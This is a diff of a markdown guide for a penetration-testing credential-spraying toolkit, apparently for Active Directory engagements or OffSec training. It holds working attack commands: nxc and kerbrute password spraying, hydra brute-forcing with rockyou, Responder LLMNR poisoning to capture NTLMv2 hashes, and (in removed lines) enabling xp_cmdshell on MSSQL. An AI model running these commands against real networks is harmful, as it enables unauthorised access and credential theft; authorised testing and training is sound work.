@@ -188,7 +188,6 @@ SSH and FTP do not support NTLM hash auth — auto-skipped with a warning when u
 
 ### ★ Re-spray all known creds (the engagement default)
 ```bash
-# After crackr.sh cracks anything — spray every cred in creds.txt
 # against every host found in recon. One command covers the whole network.
 ./sprayr.sh --from-creds
 
@@ -207,7 +206,6 @@ cat $TOOLKIT_ROOT/spray/respray_<ts>_<user>/pwnd.txt           # admin-level hit
 
 ### Post-AD enumeration spray
 ```bash
-# After adr.sh → users/all_users.txt
 # Check password policy first:
 cat $TOOLKIT_ROOT/ad/corp.local/password_policy.txt | grep -i lockout
 
@@ -237,22 +235,9 @@ cat $TOOLKIT_ROOT/ad/corp.local/password_policy.txt | grep -i lockout
 ## Troubleshooting
 
 ```bash
-# No hits — credential may be wrong
 # Sanity check manually:
 nxc smb 192.168.1.10 -u admin -p 'Password1' --local-auth
 
-# "MISS: auth failed" — credential rejected by target
-# → verify password/hash, check if account is locked, try --local-auth
-
-# "No definitive auth-failure marker" — target responded oddly
-# → check raw nxc output: cat spray/<ts>/raw/smb_spray.txt
-
-# Port closed messages on every target
-# → verify targets are up: nmap -sn 192.168.1.0/24
-
-# Domain spray — worried about lockouts
-# → get lockout policy: ./adr.sh -d corp.local -u USER -p PASS -dc DC_IP --quick
-# → use --safe for sequential + jitter
 # → spray ONE password at a time (this script sprays one cred per run by design)
 ```
 
@@ -273,23 +258,14 @@ When spray returns valid auth but no admin, the creds may only work on a specifi
 ```bash
 # RDP — doesn't need admin on most configurations
 xfreerdp /u:user /p:'pass' /d:domain /v:IP /cert-ignore +clipboard
-# If MFA or NLA error: try /sec:rdp or /sec:nla flags
-
 # MSSQL — if port 1433 open
 nxc mssql IP -u user -p pass
 impacket-mssqlclient domain/user:pass@IP -windows-auth
-# Once in: EXEC xp_cmdshell 'whoami'   (may need to enable it first)
-# EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-
 # FTP — if port 21 open
 ftp IP   # enter credentials at prompt
 
 # MySQL — if port 3306 open
 mysql -h IP -u user -p
-
-# Web application logins — try the creds on every login page found
-# Don't forget /admin, /login, /wp-login.php, /phpmyadmin, /manager/html (Tomcat)
 
 # POP3/IMAP — if ports 110/143/993/995 open
 nc -nv IP 110
@@ -309,15 +285,12 @@ ssh -i /path/to/key user@IP
 When you don't know valid usernames yet or want to avoid LDAP-based lockouts:
 
 ```bash
-# kerbrute is faster and stealthier than LDAP-based spraying
 # Enumerate valid users first (no password attempt = no lockout)
 kerbrute userenum --dc DC_IP -d corp.local userlist.txt
 
 # Then spray ONE password (check lockout policy first)
 kerbrute passwordspray --dc DC_IP -d corp.local valid_users.txt 'Summer2024!'
 
-# Common passwords to try (one at a time, respecting lockout window)
-# Password1, Welcome1, Password123!, <company>123, <month><year>
 # <season><year>, <company>@2024, <username>123
 ```
 
@@ -352,7 +325,6 @@ For login forms not covered by sprayr.sh:
 # Identify the POST data structure first
 curl -ski http://IP/login -X POST -d "user=test&pass=test" -v 2>&1 | head -30
 
-# Hydra HTTP POST form
 # Format: "/path:POST_body:failure_string"
 hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
   "/login:username=^USER^&password=^PASS^:Invalid"
@@ -381,11 +353,6 @@ When you have no working creds but you're on the same network segment:
 # Start Responder to poison LLMNR/NBT-NS/MDNS and capture Net-NTLMv2 hashes
 sudo responder -I tun0 -wdPv
 
-# Trigger authentication from a target (from any machine you control):
-# Try accessing non-existent UNC path from target
-# If you have RCE: \\KALI_IP\share   (triggers auth to your Responder)
-# If web app has SSRF: http://KALI_IP/
-
 # Cracked hash → immediately spray: ./crackr.sh -q -f ntlmv2.txt → ./sprayr.sh --from-creds
 ```
 
@@ -396,13 +363,6 @@ sudo responder -I tun0 -wdPv
 ```bash
 # Get lockout policy before ANY domain spraying
 nxc smb DC_IP -u user -p pass --pass-pol
-# Look for: Account Lockout Threshold and Observation Window
-
-# If threshold = 3 and window = 30min:
-# → Spray 1 password, wait 31 minutes, spray another
-# → Use kerbrute for the spray (Kerberos errors are less likely to increment lockout counter on old DCs)
-
-# Fine-grained password policies may protect privileged accounts differently
 # Check PSO (Password Settings Object) in BloodHound or:
 Get-ADFineGrainedPasswordPolicy -Filter * | Select-Object Name, LockoutThreshold, LockoutObservationWindow
 ```
@@ -411,10 +371,8 @@ Get-ADFineGrainedPasswordPolicy -Filter * | Select-Object Name, LockoutThreshold
 
 ## Related
 
-- [[Engagement_Methodology]] — credential spraying (Phase 11)
 - [[Toolkit_Strategy]] — the AD credential loop: `crackr -q` → `sprayr --from-creds` (§4)
 - [[adr]] — run first to get users/all_users.txt and check lockout policy
 - [[crackr]] — crack the hashes that sprayr.sh then validates
 - [[Active_Directory_PtH_PtT]] — what to do after Pwn3d! hits
 - [[Active_Directory]] — broader AD attack methodology
-- [[OffSec_AD_Mental_Model]] — decision-tree for lateral movement
